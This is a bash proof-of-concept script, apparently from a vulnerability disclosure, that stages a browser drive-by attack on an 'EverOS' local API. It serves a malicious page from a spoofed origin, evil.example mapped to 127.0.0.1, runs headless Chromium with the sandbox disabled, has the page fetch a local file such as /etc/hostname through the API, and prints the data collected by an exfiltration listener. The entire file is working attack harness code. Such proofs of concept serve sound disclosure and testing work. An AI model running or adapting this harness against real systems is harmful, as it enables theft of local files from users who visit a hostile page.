#!/usr/bin/env bash
# Render the browser drive-by: serve driveby.html from a non-loopback origin,
# run headless Chromium with the EverOS API and collector reachable locally,
# then print the exfiltrated JSON.
#
#   ./poc/browser_driveby.sh
#   API=http://127.0.0.1:18777 FILE=file:///etc/hostname ./poc/browser_driveby.sh
#
# The host-resolver map makes http://evil.example:8000 resolve to 127.0.0.1, so
# the page's Origin is non-loopback without touching DNS or /etc/hosts.
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
API="${API:-http://127.0.0.1:18777}"
FILE="${FILE:-file:///etc/hostname}"
WEB_PORT="${WEB_PORT:-8000}"
COLLECT_PORT="${COLLECT_PORT:-8899}"
OUT="${OUT:-$HERE/exfil}"

CHROME="${CHROME:-$(command -v chromium || command -v chromium-browser || command -v google-chrome || true)}"
[ -x "$CHROME" ] || { echo "Chromium not found; set CHROME=/path/to/chromium" >&2; exit 1; }

mkdir -p "$OUT"
python3 "$HERE/exfil_listener.py" >"$OUT/listener.log" 2>&1 &
LPID=$!
python3 -m http.server "$WEB_PORT" --bind 127.0.0.1 --directory "$HERE" >"$OUT/web.log" 2>&1 &
WPID=$!
trap 'kill "$LPID" "$WPID" 2>/dev/null || true' EXIT

# Patch the page at runtime is unnecessary: driveby.html points at 18777/8899.
# If API/ports differ, generate a temporary copy.
PAGE="$HERE/driveby.html"
TMP=""
if [ "$API" != "http://127.0.0.1:18777" ] || [ "$COLLECT_PORT" != "8899" ]; then
  TMP="$(mktemp "$HERE/.driveby.XXXX.html")"
  sed -e "s|http://127.0.0.1:18777|$API|g" \
      -e "s|http://127.0.0.1:8899|http://127.0.0.1:$COLLECT_PORT|g" \
      "$HERE/driveby.html" >"$TMP"
  PAGE="$TMP"
fi

sleep 1
"$CHROME" --headless=new --no-sandbox --disable-gpu --no-proxy-server \
  --host-resolver-rules="MAP evil.example 127.0.0.1" \
  --virtual-time-budget=10000 --dump-dom \
  "http://evil.example:$WEB_PORT/$(basename "$PAGE")?file=$FILE" \
  >"$OUT/dom.html" 2>"$OUT/chrome.log" || true

sleep 1
echo "[*] exfil files:"
ls -l "$OUT"/*.json 2>/dev/null || true
for f in "$OUT"/*.json; do [ -e "$f" ] && { echo "== $f"; cat "$f"; echo; }; done
if [ -n "$TMP" ]; then rm -f "$TMP"; fi
